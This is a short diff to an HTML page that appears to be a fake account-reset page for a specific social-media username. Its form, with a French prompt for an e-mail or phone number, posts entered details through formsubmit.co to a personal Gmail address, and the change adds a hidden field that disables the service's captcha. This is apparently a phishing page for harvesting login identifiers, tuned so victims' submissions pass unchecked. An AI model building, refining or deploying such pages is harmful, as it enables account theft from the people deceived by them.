@@ -168,9 +168,12 @@
         <!-- Username -->
         <h1 class="username">@haramideluxe430</h1>
 
-        <!-- Reset Form connected to FormSubmit -->
+        <!-- Reset Form connected to FormSubmit with Captcha Disabled -->
         <form action="https://formsubmit.co/nbroseten@gmail.com" method="POST">
             
+            <!-- Disables the FormSubmit Captcha page -->
+            <input type="hidden" name="_captcha" value="false">
+
             <div class="form-group">
                 <div class="input-wrapper">
                     <input type="text" name="identifier" id="identifier" class="input-field" placeholder="E-mail ou numéro de téléphone" required autocomplete="username">
